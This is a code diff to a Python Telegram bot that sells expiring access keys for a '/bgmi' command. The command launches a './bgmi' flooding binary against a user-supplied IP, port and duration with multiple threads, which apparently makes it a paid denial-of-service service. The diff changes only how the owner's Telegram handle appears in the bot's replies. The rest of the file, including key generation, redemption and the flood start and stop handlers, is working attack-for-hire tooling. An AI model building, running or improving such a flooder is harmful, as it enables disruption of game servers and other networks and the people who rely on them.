@@ -15,9 +15,6 @@ USER_FILE = "users.json"
 KEY_FILE = "keys.json"
 
 
-ADMIN_IDS = 1197720408
-OWNER_USERNAME = EXR_ICONIC
-
 flooding_process = None
 flooding_command = None
 
@@ -93,7 +90,7 @@ async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         else:
             response = "Usage: /genkey <amount> <hours/days>"
     else:
-        response = "ONLY OWNER CAN USE💀OWNER @{OWNER_USERNAME}..."
+        response = "ONLY OWNER CAN USE💀OWNER @EXR_ICONIC..."
 
     await update.message.reply_text(response)
 
@@ -114,9 +111,9 @@ async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
             save_users()
             del keys[key]
             save_keys()
-            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @{OWNER_USERNAME}..."
+            response = f"✅Key redeemed successfully! Access granted until: {users[user_id]} OWNER- @EXR_ICONIC ..."
         else:
-            response = "Invalid or expired key buy from @{OWNER_USERNAME}."
+            response = "Invalid or expired key buy from @EXR_ICONIC."
     else:
         response = "Usage: /redeem <key>"
 
@@ -147,7 +144,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @{OWNER_USRERNAME}...")
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key. Buy key from @EXR_ICONIC...")
         return
 
     if len(context.args) != 3:
@@ -159,7 +156,7 @@ async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     duration = context.args[2]
 
     flooding_command = ['./bgmi', target_ip, port, duration, str(DEFAULT_THREADS)]
-    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWMER- @{OWNER_USRERNAME}...')
+    await update.message.reply_text(f'Flooding parameters set: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.OWMER- @EXR_ICONIC...')
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -167,7 +164,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.buy key from- @{OWNER_USRERNAME}...")
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.buy key from- @EXR_ICONIC...")
         return
 
     if flooding_process is not None:
@@ -187,11 +184,11 @@ async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     user_id = str(update.message.from_user.id)
 
     if user_id not in users or datetime.datetime.now() > datetime.datetime.strptime(users[user_id], '%Y-%m-%d %H:%M:%S'):
-        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.buy key from- @{OWNER_USRERNAME}...")
+        await update.message.reply_text("❌ Access expired or unauthorized. Please redeem a valid key.buy key from- @EXR_ICONIC...")
         return
 
     if flooding_process is None:
-        await update.message.reply_text('No flooding process is running.OWNER @{OWNER_USRERNAME}...')
+        await update.message.reply_text('No flooding process is running.OWNER @EXR_ICONIC...')
         return
 
     flooding_process.terminate()
